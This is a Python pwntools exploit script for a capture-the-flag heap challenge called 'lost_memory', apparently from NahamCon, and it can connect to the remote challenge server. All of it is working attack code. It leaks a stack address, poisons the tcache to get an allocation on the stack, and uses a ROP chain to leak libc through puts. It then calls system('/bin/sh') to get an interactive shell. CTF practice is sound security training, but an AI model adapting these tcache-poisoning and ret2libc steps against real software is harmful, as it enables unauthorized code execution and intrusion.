#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./lost_memory_patched"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "challenge.nahamcon.com"
  PORT = 30483
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

def Alloc(size):
  s.sendlineafter(b"choice:\n", b"1")
  s.sendlineafter(b"like?\n", str(size).encode())

def Write(data):
  s.sendlineafter(b"choice:\n", b"2")
  s.sendlineafter(b"write?\n", data)

def Select(idx):
  s.sendlineafter(b"choice:\n", b"3")
  s.sendlineafter(b"(0 - 9)\n", str(idx).encode())

def Free():
  s.sendlineafter(b"choice:\n", b"4")

def Store():
  s.sendlineafter(b"choice:\n", b"5")

def Exit():
  s.sendlineafter(b"choice:\n", b"6")

# stack leak
Select(0)
Alloc(0x40)
Store()
s.recvuntil(b"value: ")
stack_leak = int(s.recvuntil(b"\n"), 16)
print("stack_leak =", hex(stack_leak))

Select(1)
Alloc(0x40)
Free()
Select(0)
Free()

# tcache poisoning
Write(p64(stack_leak+ 0x18))
Select(2)
Alloc(0x40)
Select(3)
Alloc(0x40)

pop_rdi_ret = 0x40132e #: pop rdi ; ret

# libc leak
buf  = b"A"*8
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
Write(buf)
Exit()
s.recvuntil(b"Exiting...\n")
puts_addr = u64(s.recvn(6)+b"\x00\x00")
libc_base = puts_addr - libc.sym.puts
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

Select(0)
Alloc(0x40)
Store()
Select(1)
Alloc(0x40)
Free()
Select(0)
Free()
# tcache poisoning
Write(p64(stack_leak+ 0x28))
Select(2)
Alloc(0x40)
Select(3)
Alloc(0x40)

system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

buf  = b"A"*8
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
Write(buf)

Exit()
  
s.interactive()  
